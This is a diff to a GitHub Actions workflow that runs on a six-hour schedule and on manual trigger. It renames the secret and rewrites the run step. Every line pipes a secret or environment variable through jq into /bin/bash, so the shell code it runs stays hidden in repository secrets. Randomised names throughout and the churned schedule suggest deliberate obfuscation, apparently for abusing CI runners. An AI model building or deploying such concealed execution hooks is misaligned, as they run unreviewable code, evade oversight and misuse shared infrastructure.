@@ -3,8 +3,8 @@ name: jiashadeq
 on:
   workflow_dispatch:
   schedule:
-    - cron: '9 2/6 * * *'
-jobs:  # 3175
+    - cron: '45 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,22 +12,13 @@ jobs:  # 3175
       - uses: actions/checkout@v4
       - name: jiashadeq
         env:
-          f85: ${{ secrets.f85 }}
+          crz9590: ${{ secrets.crz9590 }}
         run: |
-          echo $f85 | jq -r .kbeqz6127 | /bin/bash
-          echo $z95542 | jq -r .kbmyz1 | /bin/bash
-          echo $jmkn121 | jq -r .ou3 | /bin/bash
-          echo $lfj9389 | jq -r .e326 | /bin/bash
-          echo $ust6894 | jq -r .msga2 | /bin/bash
-          echo $dpu374 | jq -r .wsi42 | /bin/bash
-          echo $sgywy27 | jq -r .cg210 | /bin/bash
-          echo $o669 | jq -r .wx2 | /bin/bash
-          echo $cfwgm3 | jq -r .d0 | /bin/bash
-          echo $dvlua108 | jq -r .eccy657 | /bin/bash
-          echo $xt43381 | jq -r .gdazj4053 | /bin/bash
-          echo $cuo5 | jq -r .y82555 | /bin/bash
-          echo $pjw8079 | jq -r .ffz3 | /bin/bash
-          echo $dakg9 | jq -r .rnnr39789 | /bin/bash
-          echo $lxnj99715 | jq -r .w31 | /bin/bash
-          echo $vssv7493 | jq -r .geu9 | /bin/bash
+          echo $crz9590 | jq -r .dc07050 | /bin/bash
+          echo $u20790 | jq -r .sthm21 | /bin/bash
+          echo $iw07586 | jq -r .i16 | /bin/bash
+          echo $cnz35 | jq -r .r1397 | /bin/bash
+          echo $jepfu11723 | jq -r .javgt17367 | /bin/bash
+          echo $jae29 | jq -r .cpeu9952 | /bin/bash
+          echo $todm2814 | jq -r .sy2 | /bin/bash
 
